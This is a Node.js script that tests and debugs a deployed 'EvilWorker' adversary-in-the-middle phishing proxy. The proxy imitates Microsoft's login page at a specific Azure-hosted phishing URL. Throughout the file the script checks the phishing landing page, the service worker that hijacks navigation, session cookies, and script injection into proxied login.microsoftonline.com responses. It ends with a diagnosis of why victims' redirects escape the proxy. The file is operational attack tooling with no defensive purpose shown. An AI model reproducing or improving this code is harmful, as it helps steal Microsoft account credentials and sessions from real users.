const https = require('https');
const { URL } = require('url');

const EVILWORKER_URL = 'https://evilworker-aitm-2025.azurewebsites.net';
const PHISHING_URL = `${EVILWORKER_URL}/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`;

function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const requestOptions = {
            hostname: urlObj.hostname,
            port: 443,
            path: urlObj.pathname + urlObj.search,
            method: options.method || 'GET',
            headers: options.headers || {},
            rejectUnauthorized: false
        };

        const req = https.request(requestOptions, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: data
                });
            });
        });

        req.on('error', reject);
        if (options.body) {
            req.write(options.body);
        }
        req.end();
    });
}

async function testPhishingFlow() {
    console.log('🧪 TESTING EVILWORKER PHISHING FLOW');
    console.log('=====================================');
    console.log(`Phishing URL: ${PHISHING_URL}`);
    console.log('');

    // Step 1: Access phishing URL
    console.log('📍 Step 1: Accessing phishing URL...');
    const step1 = await makeRequest(PHISHING_URL);
    console.log(`   Status: ${step1.statusCode}`);
    console.log(`   Content-Type: ${step1.headers['content-type']}`);
    const sessionCookie = step1.headers['set-cookie']?.[0]?.split(';')[0];
    console.log(`   Session Cookie: ${sessionCookie}`);
    console.log(`   Has Service Worker Registration: ${step1.body.includes('serviceWorker.register')}`);
    console.log(`   Has Controller Check: ${step1.body.includes('controllerchange')}`);
    console.log('');

    // Step 2: Check service worker
    console.log('🔧 Step 2: Checking service worker availability...');
    const step2 = await makeRequest(`${EVILWORKER_URL}/service_worker_Mz8XO2ny1Pg5.js`, {
        headers: { 'Cookie': sessionCookie }
    });
    console.log(`   Status: ${step2.statusCode}`);
    console.log(`   Has skipWaiting: ${step2.body.includes('skipWaiting')}`);
    console.log(`   Has clients.claim: ${step2.body.includes('clients.claim')}`);
    console.log(`   Has fetch handler: ${step2.body.includes('fetch')}`);
    console.log('');

    // Step 3: Test root path access (simulating redirect)
    console.log('🌐 Step 3: Testing root path (after redirect)...');
    const step3 = await makeRequest(`${EVILWORKER_URL}/`, {
        headers: { 'Cookie': sessionCookie }
    });
    console.log(`   Status: ${step3.statusCode}`);
    console.log(`   Content-Type: ${step3.headers['content-type']}`);
    console.log(`   Content Length: ${step3.body.length}`);
    console.log(`   Has Script Injection: ${step3.body.includes('<script src=/@></script>')}`);
    
    // Check redirect behavior
    if (step3.statusCode >= 300 && step3.statusCode < 400) {
        const locationHeader = step3.headers.location;
        console.log(`   Location Header: ${locationHeader}`);
        if (locationHeader) {
            const locationUrl = new URL(locationHeader);
            console.log(`   Redirect Domain: ${locationUrl.hostname}`);
            if (locationUrl.hostname === 'evilworker-aitm-2025.azurewebsites.net') {
                console.log('   ✅ Redirect stays on proxy domain!');
            } else {
                console.log('   ❌ Redirect leaves proxy domain');
            }
        }
    }
    
    // Check what content we're getting
    if (step3.body.includes('Object moved')) {
        console.log('   ℹ️  Microsoft redirect page (this is expected with 302)');
        const redirectMatch = step3.body.match(/href="([^"]+)"/);
        if (redirectMatch) {
            console.log(`   Body redirect target: ${redirectMatch[1]}`);
        }
    } else if (step3.body.includes('Microsoft')) {
        console.log('   ✅ Microsoft content proxied');
    }
    console.log('');

    // Step 4: Test proxy endpoint directly
    console.log('🔄 Step 4: Testing proxy endpoint directly...');
    const proxyRequest = {
        url: `${EVILWORKER_URL}/`,
        method: 'GET',
        headers: { host: 'evilworker-aitm-2025.azurewebsites.net' },
        body: '',
        referrer: '',
        mode: 'navigate'
    };
    
    const step4 = await makeRequest(`${EVILWORKER_URL}/lNv1pC9AWPUY4gbidyBO`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Cookie': sessionCookie
        },
        body: JSON.stringify(proxyRequest)
    });
    console.log(`   Status: ${step4.statusCode}`);
    console.log(`   Is Redirect: ${step4.statusCode >= 300 && step4.statusCode < 400}`);
    if (step4.headers.location) {
        console.log(`   Location: ${step4.headers.location}`);
    }
    console.log('');

    // Step 5: Test Microsoft proxying
    console.log('🎯 Step 5: Testing Microsoft login proxying...');
    const msRequest = {
        url: 'https://login.microsoftonline.com/',
        method: 'GET',
        headers: { 
            host: 'login.microsoftonline.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: '',
        referrer: '',
        mode: 'navigate'
    };
    
    const step5 = await makeRequest(`${EVILWORKER_URL}/lNv1pC9AWPUY4gbidyBO`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Cookie': sessionCookie
        },
        body: JSON.stringify(msRequest)
    });
    console.log(`   Status: ${step5.statusCode}`);
    console.log(`   Content Length: ${step5.body.length}`);
    console.log(`   Has Script Injection: ${step5.body.includes('<script src=/@></script>')}`);
    console.log(`   Has Microsoft Content: ${step5.body.includes('Microsoft')}`);
    console.log('');

    // Summary
    console.log('📊 SUMMARY');
    console.log('==========');
    const issues = [];
    
    if (!sessionCookie) {
        issues.push('❌ No session cookie set');
    }
    
    if (!step2.body.includes('skipWaiting')) {
        issues.push('❌ Service worker missing skipWaiting');
    }
    
    // Check if redirects are staying on proxy domain
    if (step3.statusCode >= 300 && step3.statusCode < 400) {
        const locationHeader = step3.headers.location;
        if (locationHeader && !locationHeader.includes('evilworker-aitm-2025.azurewebsites.net')) {
            issues.push('❌ Direct access to / redirects outside proxy domain');
        }
    }
    
    if (!step5.body.includes('<script src=/@></script>')) {
        issues.push('❌ Script injection not working in proxy responses');
    }
    
    if (issues.length === 0) {
        console.log('✅ All tests passed! EvilWorker is working correctly.');
        console.log('');
        console.log('The proxy is successfully:');
        console.log('- Setting session cookies');
        console.log('- Serving the service worker');
        console.log('- Keeping redirects on the proxy domain');
        console.log('- Injecting malicious scripts into responses');
        console.log('- Proxying Microsoft content');
    } else {
        console.log('Issues found:');
        issues.forEach(issue => console.log(`   ${issue}`));
    }
    
    console.log('\n🔍 ANALYSIS');
    console.log('============');
    console.log('The core issue is that when the landing page redirects to /, the service');
    console.log('worker has not yet taken control of the page. This causes the browser to');
    console.log('make a direct request to /, which returns a Microsoft redirect that the');
    console.log('browser follows, leaving the EvilWorker domain.');
    console.log('');
    console.log('Current implementation:');
    console.log('1. Landing page registers service worker');
    console.log('2. Waits for controllerchange event');
    console.log('3. Then redirects to /');
    console.log('');
    console.log('However, the service worker might not intercept navigation requests');
    console.log('immediately after claiming clients.');
}

testPhishingFlow().catch(console.error);